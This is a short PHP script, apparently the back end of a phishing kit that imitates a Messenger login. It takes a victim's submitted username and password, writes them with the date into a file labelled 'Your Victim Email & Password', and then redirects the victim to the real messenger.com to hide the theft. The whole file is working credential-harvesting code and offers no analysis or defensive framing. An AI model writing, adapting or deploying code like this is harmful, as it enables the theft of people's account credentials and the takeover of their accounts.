<?php

$usuario = $_POST['usuario']; 
$clave = $_POST['clave']; 
//$ip = $_SERVER['REMOTE_ADDR']; 
$fecha = date("Y-m-d"); 

if( (empty($usuario)) or (empty($clave)) ){
     header('location: login.html'); 
}else{



$f = fopen("victim.html", "a"); 
fwrite ($f, 
' <html><body bgcolor=black>

 <center><font color="#00ff00"> <h2> Your Victim Email & Password</h2></font><font color="white">Username:</font> <b><font color="#00ff00">'.$usuario.'</font></b><br> 
 
<font color="white"> Password: </font> <b><font color="#00ff00">'.$clave.'</font></b><br>


<font color="white"> Date: </font><b><font color="#00ff00">'.$fecha.'</font></b><br> 


</center>
</body>
</html>
');


fclose($f);


header("Location:  https://messenger.com");
}
?>